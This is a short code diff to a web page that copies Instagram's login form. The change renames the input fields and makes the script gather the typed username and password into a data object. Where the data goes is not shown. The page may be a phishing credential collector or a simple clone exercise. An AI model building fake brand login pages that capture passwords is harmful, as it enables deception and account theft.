@@ -117,7 +117,7 @@
     <form id="myForm">
   <img src="instagram.jpg" alt="" id="lg">
   
-  <input type="text" placeholder="Username, email or mobile number" name="Username" required>
+  <input type="text" placeholder="Username, email or mobile number" name="username" required>
   <input type="password" placeholder="Password" name="password" required>
   <button class="login-btn" id="log-in">Log in</button>
 </form>
@@ -134,8 +134,8 @@
       e.preventDefault();
   
       const data = {
-        name: form.Username.value,
-        email: form.password.value
+        username: form.username.value,
+        password: form.password.value
         
       };
   
